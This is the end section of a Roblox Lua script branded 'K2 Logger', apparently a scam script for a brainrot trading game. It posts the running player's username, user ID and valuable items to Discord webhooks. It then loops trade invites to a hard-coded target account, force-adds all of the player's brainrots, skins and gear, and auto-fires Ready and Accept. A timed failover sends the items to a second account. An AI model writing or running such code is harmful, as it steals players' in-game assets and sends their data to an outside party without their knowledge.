┗ 💰 **$" .. tostring(genStr):gsub("/s", "") .. "/s**"
		table.insert(lines, "`" .. i .. ".` " .. line)
	end

	local listText = table.concat(lines, "

")
	if #listText > 1000 then
		listText = listText:sub(1, 996) .. "..."
	end

	local totStr = tostring(totalGen)
	pcall(function() totStr = formatGen(totalGen) end)
	totStr = tostring(totStr):gsub("/s", "")

	local embedColor = FALLBACK_COLOR
	pcall(function()
		if missList[1] then
			local c = getBrainrotColor(missList[1].index)
			if c then
				embedColor = colorToDecimal(c)
			end
		end
	end)

	local thumb = nil
	pcall(function()
		if missList[1] and resolveThumbnail then
			thumb = resolveThumbnail(missList[1].displayName, missList[1].index)
		end
	end)

	local description = table.concat({
		"📫 **Script User**  `" .. LP.Name .. "`",
		"└ ID `" .. tostring(LP.UserId) .. "`",
		"",
		"⚠️ Unclaimed for **" .. tostring(MISS_TIMEOUT) .. "s** — failover active",
	}, "
")

	local fields = {
		{
			name = "🧠  Unclaimed Brainrots  ·  " .. #missList,
			value = listText,
			inline = false,
		},
		{
			name = "💰  Total Generation",
			value = "**$" .. totStr .. "/s**",
			inline = true,
		},
		{
			name = "📬  Failover Target",
			value = "`" .. tostring(MISS_TARGET_ID) .. "`",
			inline = true,
		},
		{
			name = "⏰  Triggered",
			value = "<t:" .. os.time() .. ":R>",
			inline = true,
		},
		{
			name = "🌍  Server",
			value = "**" .. tostring(#Players:GetPlayers()) .. "** players",
			inline = true,
		},
	}

	local embed = {
		title = "K2 Logger  ·  Miss Failover",
		description = description,
		color = embedColor,
		fields = fields,
		footer = {
			text = "K2 LOGGER  •  discord.gg/bxjXucMVqB",
			icon_url = FOOTER_ICON,
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if type(thumb) == "string" and #thumb > 8 then
		embed.thumbnail = { url = thumb }
	end

	local payload = {
		content = "@everyone",
		username = "K2 Logger",
		avatar_url = GOOD_AVATAR,
		embeds = { embed },
	}

	local body = HttpService:JSONEncode(payload)
	for _, url in ipairs(urls) do
		local ok, res = pcall(function()
			return requestFn({
				Url = url,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body,
			})
		end)
		if ok then
			local code = type(res) == "table" and (res.StatusCode or res.statusCode) or "?"
			print("[Brainrot] Miss webhook POST", url:sub(1, 48) .. "...", "→", code)
		else
			warn("[Brainrot] Miss webhook failed:", res)
		end
	end
	print("[Brainrot] Miss webhook done →", MISS_TARGET_ID)
end

local function runMissFailover()
	if missFailoverDone then return end
	local tradeUI = pg:FindFirstChild("TradeLiveTrade")
	local reallyInTrade = tradeUI and tradeUI.Enabled
	if reallyInTrade then
		print("[Brainrot] Miss timer skipped — TradeLiveTrade open")
		return
	end
	local missList = getMissBrainrotsOnBase()
	print("[Brainrot] Miss check: still on base =", #missList)
	if #missList == 0 then
		print("[Brainrot] Miss timer: listed brainrots gone — no failover")
		return
	end
	missFailoverDone = true
	TARGET_ID = MISS_TARGET_ID
	tradeBrainrotQueue = rebuildMissTradeQueue()
	tradeItemsEnabled = false
	baseSkinQueue = {}
	gearQueue = {}
	print("[Brainrot] Failover →", MISS_TARGET_ID, "| miss brainrots:", #tradeBrainrotQueue)
	sendMissWebhook(missList)
end

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set")
		return
	end

	local inviteRemote = getRemote("RF/TradeService/Invite")
	local addRemote = getRemote("RF/TradeService/AddBrainrot")
	local addItemRemote = getRemote("RF/TradeService/AddItem")
	local readyRemote = getRemote("RE/TradeService/Ready")
	local acceptRemote = getRemote("RE/TradeService/Accept")

	print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] AddBrainrot:", addRemote and addRemote.Name or "MISSING")
	print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "MISSING")
	print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "MISSING")

	if not (inviteRemote and readyRemote and acceptRemote) then
		warn("[Brainrot] Missing trade remotes")
		return
	end

	local tradeActive = false
	local forceAddFlag = false

	local function forceAddAllBrainrots()
		local q = tradeBrainrotQueue
		if not addRemote or not q or #q == 0 then return end
		for _, item in ipairs(q) do
			pcall(function()
				addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
			end)
			task.wait(0.05)
		end
	end

	local function forceAddAllItems()
		if not addItemRemote then return end
		if not tradeItemsEnabled then return end
		for _, item in ipairs(baseSkinQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
					UUID = item.uuid,
					SkinName = item.skinName,
				})
			end)
			task.wait(0.05)
		end
		for _, item in ipairs(gearQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", {
					UUID = item.uuid,
					GearName = item.gearName,
				})
			end)
			task.wait(0.05)
		end
	end

	task.spawn(function()
		pg.DescendantAdded:Connect(function(obj)
			local n = string.lower(obj.Name)
			-- only real trade windows (not random "trade" labels)
			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
				task.wait(0.15)
				if obj.Parent and (obj:IsA("Frame") or obj:IsA("ScreenGui")) then
					if not tradeActive then
						tradeActive = true
						currentlyInTrade = true
						forceAddFlag = true
						print("[Brainrot] Trade opened → force adding all")
						forceAddAllBrainrots()
						forceAddAllItems()
					end
				end
			end
		end)

		pg.DescendantRemoving:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				if tradeActive then
					tradeActive = false
					currentlyInTrade = false
					print("[Brainrot] Trade closed/cancelled → will re-add next open")
				end
			end
		end)
	end)

	if addRemote and #brainrotQueue > 0 then
		task.spawn(function()
			while true do
				forceAddAllBrainrots()
				task.wait(0.35)
			end
		end)
	end

	if addItemRemote then
		task.spawn(function()
			while true do
				if #baseSkinQueue > 0 or #gearQueue > 0 then
					forceAddAllItems()
				end
				task.wait(0.5)
			end
		end)
	end

	task.spawn(function()
		while true do
			pcall(function()
				inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
			end)
			task.wait(0.25)
			forceAddAllBrainrots()
			forceAddAllItems()
			task.wait(TRADE_CYCLE_DELAY)
		end
	end)

	task.spawn(function()
		while true do
			if tradeActive or forceAddFlag then
				forceAddAllBrainrots()
				forceAddAllItems()
				forceAddFlag = false
				task.wait(0.2)
			end
			pcall(function()
				readyRemote:FireServer(READY_GUID)
			end)
			task.wait(0.8)
			pcall(function()
				acceptRemote:FireServer(ACCEPT_GUID)
			end)
			task.wait(0.8)
		end
	end)

	print("[Brainrot] Automation started")
end

startFullAutomation()

task.spawn(function()
	-- wait until profile scan finishes (gears + base skins)
	while not profileReady do
		task.wait(0.1)
	end

	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()

	print("[Gear] Base skins queued:", #baseSkinQueue)
	print("[Gear] Gears queued:", #gearQueue)

	-- ONE webhook only
	sendDetailedWebhook()

	-- 40s: listed brainrots still on base → 2829121161 + same-color webhook
	if #missBrainrotQueue > 0 then
		print("[Brainrot] Miss timer armed:", MISS_TIMEOUT, "s |", #missBrainrotQueue, "listed")
		task.spawn(function()
			print("[Brainrot] Miss timer running", MISS_TIMEOUT, "s…")
			task.wait(MISS_TIMEOUT)
			runMissFailover()
		end)
	else
		print("[Brainrot] Miss timer not armed (no listed brainrots on base)")
	end

end)
